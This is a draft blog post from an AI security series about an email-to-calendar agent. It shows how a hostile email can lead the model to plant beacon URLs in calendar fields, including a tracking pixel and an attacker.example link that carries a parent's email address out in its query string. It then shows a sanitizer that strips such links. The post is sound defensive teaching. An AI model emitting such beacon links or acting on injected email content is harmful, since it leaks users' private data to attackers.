---
title: "The calendar-field exfil"
description: "The last post stopped a secret coming in. This one stops a secret going out, through the one thing the agent sends into the world: the calendar file it writes. A URL hidden in an event's location or notes is a beacon that fires when a calendar app renders it, so the agent's writer strips every link from every field before the file is ever saved."
date: 2026-10-12
draft: true
tags: ["ai-security", "golang", "agents", "exfiltration"]
series: "AI Security Engineering"
---

_Part of my [AI Security Engineering](/blog/the-plan/) series, a local email-to-calendar agent I build, then attack, then harden. If you have not set up the lab yet, start with [Set up your lab](/blog/setting-up-the-lab/). The lessons are [on GitHub](https://github.com/t0ul/ai-security-engineering), and the agent itself lives at [t0ul/emaildrop](https://github.com/t0ul/emaildrop)._

## Inert is not the same as harmless

[The last post](/blog/scrubbing-secrets-and-pii/) stopped a secret from getting into the agent's memory. This one stops a secret from getting out. Way back in [the inert-output post](/blog/inert-output-and-the-human-accept/) I made a point of the agent writing a calendar file and nothing else, no auto-add, nothing that touches a real calendar on its own. That makes the output safe to accept by hand. It does not make the output content safe, and those are different things.

Here is the gap. The fields of an event, its location and its notes, are filled from the email, which means a hostile email can put whatever it wants in them, by way of the model. And a calendar file is not just read; it is rendered by a calendar app, which will happily turn a URL in a location or a notes field into something it fetches or something you click. So a link sitting in an event field is a beacon. It fires when the event is displayed, and its query string can carry data out. The file never ran anything. The calendar app did the reaching, on the attacker's behalf. This is LLM05, improper output handling, and it is a control lesson, deterministic, no model:

```bash
cd posts/05.2-the-calendar-field-exfil
go run .
```

## I. A field is a channel

Take an ordinary event, a Book Fair, whose fields have been poisoned: a tracking pixel in the location, and a notes line that smuggles a parent's address out in a link's query string. Write it the obvious way, serializing each field straight into the `.ics`, and look at what you get:

```
== before: a naive calendar writer ==
  LOCATION:Library http://attacker.example/pixel.gif
  DESCRIPTION:RSVP at http://attacker.example/exfil?who=parent.contact@example.com
  the beacon host "attacker.example" is in the file: true (it fires when the event is rendered)
```

Both URLs are right there in the file. The naive writer did nothing wrong as a serializer; it put the event's fields into the event. But a faithful serializer of attacker-controlled fields is an exfiltration tool. When this event is imported and shown, the pixel in the location fetches on render, and the address in the notes is one click from leaving. The data the last post kept out of the corpus walks right out through the calendar instead.

## II. The field sanitizer

The writer has to treat those fields as what they are: untrusted output, filled by a model that read a stranger's email. So the agent's real calendar writer, `ics.Write`, runs every field through a sanitizer on the way out. It finds links and active schemes, plain `http` and `https` but also the sneakier `data:` and `javascript:`, and replaces each with a visible placeholder, and it returns a count of how many it pulled out so the removal is auditable. What it defends against is exactly this: a URL in a rendered field can never leave the agent, because the agent never writes one.

Here is the same poisoned event through the real writer:

```
== after: the agent's real ics.Write ==
  LOCATION:Library [link removed]
  DESCRIPTION:RSVP at [link removed]
  links/schemes removed: 2; the beacon host in the file: false
```

Two links removed, and the attacker's host is nowhere in the file. The event is still a perfectly good calendar entry, a Book Fair at the library with an RSVP note, it just no longer carries a beacon. The exfiltration channel went from open to closed, measured by the one thing that matters: whether the attacker's host survives into the file, and it does not.

## A note on the links we do keep

There is one honest exception worth naming, because "strip every URL" is too blunt a rule to be the real one. The agent does handle genuine action items, an RSVP link, a permission-slip form, where the link is the entire point, and for those it keeps the URL. But it keeps it only after checking the URL is a well-formed `http` or `https` address, and it never lets that link fire on its own: following it is gated and sandboxed at the moment you choose to act on it, which is its own post later in the book. So the rule is not "no URLs." It is that a link is never emitted as a live field that a calendar app will quietly reach on its own. A link the agent keeps is one a human deliberately acts on, through a gate, not one that beacons the instant an event is drawn on screen.

## Conclusion

So the agent's one piece of output can no longer be turned into a quiet channel for data to leave. Secrets are scrubbed before they are stored, and links are stripped before the calendar file is written, which closes the two obvious ends, what comes in and what the agent itself sends out.

There is a third surface, and it is the one people forget because it does not feel like output at all: the screen. The next post is the tracking pixel in a different disguise, a markdown image or link in something the agent shows you, which your own browser renders and beacons the moment the page loads. The fix rhymes with this one, allow-list what is safe to render, but the surface is new.
